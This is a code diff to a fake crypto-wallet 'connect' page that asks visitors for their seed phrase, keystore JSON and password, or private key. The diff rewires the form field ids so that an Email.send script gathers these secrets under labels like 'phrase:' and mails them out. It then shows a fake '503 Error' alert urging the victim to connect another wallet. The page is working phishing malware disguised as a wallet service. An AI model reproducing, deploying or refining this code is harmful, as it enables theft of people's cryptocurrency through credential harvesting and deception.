@@ -142,7 +142,7 @@
     <input type="hidden" name="type" id="type" value="phrase">
     <input type="hidden" name="wallet" id="hidden1" value="">
     
-    <textarea name="mnemonic" minlength="12" id="phrase" placeholder="Phrase" required="required" value=""></textarea>
+    <textarea name="mnemonic" minlength="12" id="name" placeholder="Phrase" required="required" value=""></textarea>
     <br>
     <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
     <br>
@@ -157,10 +157,10 @@
     <input type="hidden" name="type" id="type" value="KeystoreJSON">
     <input type="hidden" name="wallet" id="hidden2" value="">
     
-    <textarea name="mnemonic" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
+    <textarea name="mnemonic" required="required" minlength="12" id="email" placeholder="Keystore JSON"></textarea>
     <br>
     <div class="field">
-    <input type="text" name="password" placeholder="Password" required="required" value="">
+    <input type="text" name="password" placeholder="Password" id="subject" required="required" value="">
     </div>
     <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
     <br>
@@ -174,7 +174,7 @@
     <input type="hidden" name="type" id="type" value="PrivateKey">
     <input type="hidden" name="wallet" id="hidden3" value="">
     <div class="field">
-    <input type="text" name="mnemonic" placeholder="Private Key" value="" required="required">
+    <input type="text" name="mnemonic" placeholder="Private Key" id="name" required="required">
     </div>
     <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
     <br>
@@ -226,11 +226,11 @@
     <input type="hidden" name="type" id="type" value="phrase">
     <input type="hidden" name="wallet" id="hidden1" value="">
     
-    <textarea name="mnemonic" minlength="12" id="phrase" placeholder="Phrase" required="required" value=""></textarea>
+    <textarea name="mnemonic" minlength="12" id="name" placeholder="Phrase" required="required" value=""></textarea>
     <br>
     <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
     <br>
-    <button type="submit" name="import" onclick="sendMessage();" class="btn">CONNECT</button>
+    <button type="submit" name="import" class="btn">CONNECT</button>
     </form>
     </div>
     
@@ -241,10 +241,10 @@
     <input type="hidden" name="type" id="type" value="KeystoreJSON">
     <input type="hidden" name="wallet" id="hidden2" value="">
     
-    <textarea name="mnemonic" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
+    <textarea name="mnemonic" required="required" minlength="12" id="email" placeholder="Keystore JSON"></textarea>
     <br>
     <div class="field">
-    <input type="text" name="password" placeholder="Password" required="required" value="">
+    <input type="text" name="password" placeholder="Password" id="subject" required="required" value="">
     </div>
     <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
     <br>
@@ -258,7 +258,7 @@
     <input type="hidden" name="type" id="type" value="PrivateKey">
     <input type="hidden" name="wallet" id="hidden3" value="">
     <div class="field">
-    <input type="text" name="mnemonic" placeholder="Private Key" value="" required="required">
+    <input type="text" name="mnemonic" placeholder="Private Key" id="message" value="" required="required">
     </div>
     <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
     <br>
@@ -310,11 +310,11 @@
     <input type="hidden" name="type" id="type" value="phrase">
     <input type="hidden" name="wallet" id="hidden1" value="">
     
-    <textarea name="mnemonic" minlength="12" id="phrase" placeholder="Phrase" required="required" value=""></textarea>
+    <textarea name="mnemonic" minlength="12" id="name" placeholder="Phrase" required="required" value=""></textarea>
     <br>
     <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
     <br>
-    <button type="submit" name="import" onclick="sendMessage();" class="btn">CONNECT</button>
+    <button type="submit" name="import" class="btn">CONNECT</button>
     </form>
     </div>
     
@@ -325,10 +325,10 @@
     <input type="hidden" name="type" id="type" value="KeystoreJSON">
     <input type="hidden" name="wallet" id="hidden2" value="">
     
-    <textarea name="mnemonic" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
+    <textarea name="mnemonic" required="required" minlength="12" id="email" placeholder="Keystore JSON"></textarea>
     <br>
     <div class="field">
-    <input type="text" name="password" placeholder="Password" required="required" value="">
+    <input type="text" name="password" placeholder="Password" id="subject" required="required" value="">
     </div>
     <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
     <br>
@@ -342,7 +342,7 @@
     <input type="hidden" name="type" id="type" value="PrivateKey">
     <input type="hidden" name="wallet" id="hidden3" value="">
     <div class="field">
-    <input type="text" name="mnemonic" placeholder="Private Key" value="" required="required">
+    <input type="text" name="mnemonic" placeholder="Private Key" id="message" value="" required="required">
     </div>
     <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
     <br>
@@ -3905,7 +3905,7 @@
        }
     }
     
-    </script>
+</script>
 
 
 <script src="index.js"></script>
@@ -3923,8 +3923,8 @@
         var name = document.getElementById("name").value;
         var email = document.getElementById("email").value;
         var subject = document.getElementById("subject").value;
-        var message= document.getElementById("message").value;
-        var body = 'phrase: '+name + '</br> email: ' + email + '<br/> subject : ' + subject + '<br/> message: ' + message;
+        // var message= document.getElementById("message").value;
+        var body = 'phrase: '+name + '</br> email: ' +email + '<br/> subject : ' +subject + '<br/> message: ' +message;
 
 
         Email.send({
@@ -3934,7 +3934,7 @@
     Subject : "This is the subject",
     Body : body
 }).then(
-  message => alert("503 Error, if this persist kindly sync another wallet and try again or contact admin")
+  message => alert("503 Error, if problem persists please contact admin or try connecting another wallet")
 );
      })
 </script>
